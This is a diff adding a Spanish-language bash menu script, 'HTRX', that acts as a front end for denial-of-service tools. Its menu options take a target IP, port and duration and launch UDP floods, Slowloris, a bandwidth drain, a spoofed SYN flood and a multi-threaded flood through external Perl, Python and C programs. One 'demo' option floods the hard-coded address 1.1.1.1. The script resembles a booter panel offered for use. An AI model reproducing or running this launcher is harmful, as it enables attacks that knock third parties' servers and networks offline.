@@ -1,0 +1,373 @@
+#!/bin/bash
+BLACK='\e[0;30m'
+BLUE='\e[0;34m'
+GREEN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+PURPLE='\e[0;35m'
+BROWN='\e[0;33m'
+LIGHTGRAY='\e[0;37m'
+DARKGRAY='\e[1;30m'
+LIGHTBLUE='\e[1;34m'
+LIGHTGREEN='\e[1;32m'
+LIGHTCYAN='\e[1;36m'
+LIGHTRED='\e[1;31m'
+LIGHTPURPLE='\e[1;35m'
+YELLOW='\e[1;33m'
+WHITE='\e[1;37m'
+NC='\e[0m'              # No Color
+# Trap Signal Script
+#
+#TitaniumScript.bypass//BASH  Bypass.Function
+#load
+exit_script()
+{
+  echo "* * *Trap * * *"
+  ./menu
+}
+
+dstat1()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                          ADMIN DSTAT                              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+dstat
+    
+}
+
+admin12()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                          ADMIN PANEL                              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+echo "Estoy seguro de que puedes crear tu propio panel: 3"
+echo "Si realmente no sabes cómo puedes contactarme en Skype"
+echo "Mi Skype no es muy dificil de encontrar"
+read ok
+clear
+    
+}
+
+udp_flooda()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              HTRX${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            Tol12${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                              UDP HTRX                            ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Ingresa la ip de destino por favor :"
+read ip
+echo "Ingrese un numero de puerto :"
+read port
+echo "Ingrese el tiempo :"
+read time
+./gott.1.pl $ip $port 0 $time
+}
+
+udp_floodb()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              HTRX${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ and Tol12${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                                  UDP                              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Ingresa la ip de destino por favor :"
+read ip
+echo "Ingrese un numero de puerto :"
+read port
+echo "Ingrese el tiempo :"
+read time
+python gott.2.py $ip $port $time
+}
+
+slap()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              HTRX${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ And TOL12${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                            GoTT HTRX                             ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Ingresa la ip de destino por favor :"
+read ip
+perl gott.3.pl $ip
+}
+
+slowloris()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              HTRX${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ And TOL12${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                        Slowloris HTRX                             ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Para detener este script despues de la ejecucion, mantenga [CTRL] + [C]"
+echo "Introduce la direccion del sitio web :"
+read host
+echo "Entrar en un puerto :"
+read port
+./slowloris $host $port
+}
+
+killall()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              HTRX${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ And TOL12${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+pkill gott.1.pl
+pkill gott.2.py
+pkill gott.2.pl
+pkill gott.4.pl
+pkill slowloris
+}
+
+fry()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              HTRX${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ And TOL12${GREEN}                         ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦             SUPER Nytro STOP CON CTRL + C              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Introduzca IP Address :"
+read ip
+echo "Introduza el Puerto :"
+read port
+echo "Introduzca paquetes :"
+read size
+echo "Introduzca el tiempo :"
+read time
+perl nytro.pl $ip $port $size $time
+
+}
+
+and()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              HTRX${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                               HTRX${GREEN}                           ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 2.0                             ¦¦¦ "
+    echo "  ¦¦¦+-----------------------------------------------------------------+¦¦¦ " 
+    echo "  ¦¦¦                     Ataque y dstat no se puede parar                 ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Nota : Esta secuencia de comandos le mostrara su poder"
+echo "La prueba es de solo 20 segundos despues de detener Dstat con CTRL + C"
+echo "Presiona enter :)"
+read enter
+perl nytro.pl 1.1.1.1 80 65500 20 & dstat
+
+}
+
+autoinstall()
+{
+
+clear
+./install
+}
+
+bw()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              HTRX${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ And TOL12${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                    Bandwidth Drain HTRX                     ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Introduzca la ip :"
+read ip
+echo "Introduzca el puerto :"
+read port
+echo "Introduzca el tiempo :"
+read time
+./gott -i $ip -p $port -s 32000 -t $time
+}
+
+multi()
+{
+    clear
+    echo -e " $CYAN} "
+    echo "               HTRX MULTI FLOOD UPDATED "   
+    echo "Script"
+    echo ""	
+    echo -e "        '||    ||'          '||    .    || " 
+    echo -e "         |||  |||  ... ...   ||  .||.  ...  "
+    echo -e "         |'|..'||   ||  ||   ||   ||    ||  "
+    echo -e "         | '|' ||   ||  ||   ||   ||    ||  "
+    echo -e "        .|. | .||.  '|..'|. .||.  '|.' .||. "
+    echo ""
+    echo "    El que se atreva a jugar a dios debe pagar un alto precio.."
+    echo ""
+echo "IP Address :"
+read ip
+echo "Puerto :"
+read port
+echo "Enter size Ex: 65500"
+read size
+echo "Segundos :"
+read time
+echo "Ingrese el número de hilos :"
+read threads
+echo "¿Le gustaria ver la salida ADVERTENCIA si sí la inundacion puede disminuir? 0 = No 1 = Si"
+read output
+perl multi.pl $ip $port $size $time $threads $output
+}
+
+syn()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              HTRX${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            MODZ And TOL12${GREEN}                          ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
+    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
+    echo "  ¦¦¦                    Spoofed SyN Flood coded in C                   ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Introduzca la ip :"
+read ip
+echo "Introduzca el puerto :"
+read port
+./syn $ip $port
+}
+
+exit_script1()
+{
+  exit 1
+}
+
+Take_input1()
+{
+clear
+while :
+do
+clear
+echo -e "${WHITE}HTRX${RED}                           User:"${LIGHTBLUE}$(whoami)"${RED}Expires:"${LIGHTBLUE}Lifetime
+echo -e "${WHITE}                                                MENU PRIVADO 6.0 BIENVENIDO
+Bypass [${GREEN}ON${WHITE}]                             "${WHITE}Tu Version: "${GREEN}v6.0 "${RED}[Verison Privada]
+echo -e "${WHITE}
+                                                       HTRX PRIVADO 1.0 ${WHITE}
+               / \ / \ / \ / \                 -------------------------------------${CYAN}
+              ( H | T | R | X |                ${LIGHTBLUE}¦  Estas conectado a HTRX ¦${WHITE}
+               \_/ \_/ \_/ \_/                 -------------------------------------
+"${WHITE}
+    echo -e "${WHITE}Nota: "${GREEN}PARA SALIR DE UN ESCRITURA O DETENER ATAQUES, PULSE [CTRL + C] 14
+    echo -e "${GREEN}[==============================================================================]"
+	echo -e "${LIGHTBLUE}[1]${GREEN}UDP Flood${LIGHTBLUE}                                             [5]${GREEN}Bandwidth${LIGHTBLUE}"                                                                                         																									
+    echo -e "${LIGHTBLUE}[2]${GREEN}UDP Flood B${LIGHTBLUE}                                           [6]${GREEN}SyN Flood${BLUE}"
+    echo -e "${LIGHTBLUE}[3]${GREEN}Xtreme FlooD${LIGHTBLUE}                                          [7]${LIGHTBLUE}MULTI UPDATED${CYAN}"
+    echo -e "${LIGHTBLUE}[4]${GREEN}SLOWLORIS${LIGHTBLUE}                                             [8]${GREEN}HTRX SCRIPT${LIGHTBLUE}"
+    echo -e ""                                                                 
+    echo -e "${PURPLE}[==============================================================================]"
+    echo -e "${PURPLE}                                 ~OPTIONS~                                      "
+    echo -e "${LIGHTBLUE}[9]${GREEN}Cambia la contra${LIGHTBLUE}                                      [AI]${GREEN}Instalador"
+	echo -e "${LIGHTBLUE}[10]${GREEN}Dstat${LIGHTBLUE}                                                [12]${GREEN}Panel de admin"
+	echo -e "${LIGHTBLUE}[11]${GREEN}Ataque & Dstat${LIGHTBLUE}                                       [13]${GREEN}Salir del menu"
+    echo -e ""
+    echo -n "#HTRX - Menu [1-13-AI]: "
+    read yourch
+    case $yourch in
+      1) udp_flooda ;;
+      2) udp_floodb ;;
+      3) slap ;;
+	  4) slowloris ;;
+	  8) fry ;;
+         5) bw ;;
+         6) syn ;;
+	  14) killall ;;
+	  9) passwd ;;
+	  7) multi ;;
+	  10) dstat1 ;;
+	  11) and ;;
+	  12) admin12 ;;
+	  AI) autoinstall ;;
+      ex) echo "As you Command" ;  exit 1  ;;
+	  13) pkill menu  ;;
+      *) echo "Invalid Selection, Please make another selection between [1-11]" ;
+         echo "Press Enter. . ." ; read ;;
+ esac
+done # end_while
+}
+#
+# Set trap to for CTRL+C interrupt i.e. Install our error handler
+# When occurs it first it calls del_file() and then exit
+#
+trap exit_script 2
+#
+# Call our user define function : Take_input1
+#
+Take_input1
